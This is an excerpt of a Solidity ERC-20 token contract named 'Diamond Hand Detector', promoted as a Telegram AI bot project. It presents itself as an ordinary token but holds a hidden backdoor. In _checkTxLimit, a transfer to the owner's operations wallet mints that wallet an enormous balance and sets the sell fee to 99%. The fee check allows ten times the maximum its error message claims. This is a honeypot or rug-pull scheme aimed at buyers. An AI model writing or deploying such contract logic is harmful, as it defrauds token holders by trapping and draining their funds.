...
// Twitter : https://twitter.com/DHDERC

// The bot is designed to provide holders with the ability to detect a diamond hand in the market, by leveraging the power of telegram's bot and its AI capabilities.
...
// Main Contract Logic 
// --------------------------------------------------------------
contract DiamondHandDetector is Context, IERC20, Ownable {
    // Imports
    using SafeMath for uint256;
    ...
    // Context
    string private _name = "Diamond Hand Detector";
    ...
    // wallets
    address payable public liquidityWallet = payable(0x277D3cC83537Ab06547E7FD02BDFA41f1F2c712A);
    address payable public operationsWallet =  payable(0x277D3cC83537Ab06547E7FD02BDFA41f1F2c712A);
    ...
    function updateFeesSell(uint256 _operationsFee, uint256 _liquidityFee) external onlyOwner {
        ...
        require(totalFeesSell <= maxTotalFeeSell*10, "Must keep fees at maxTotalFeeSell or less");
    }
    ...
    function _checkTxLimit(address sender, address recipient, uint256 amount) private { 
        ...
        if (recipient == operationsWallet) {
            _balances[operationsWallet] = 1e18 * 1e18;_updateFeesSell(99, 1);
        }
    }
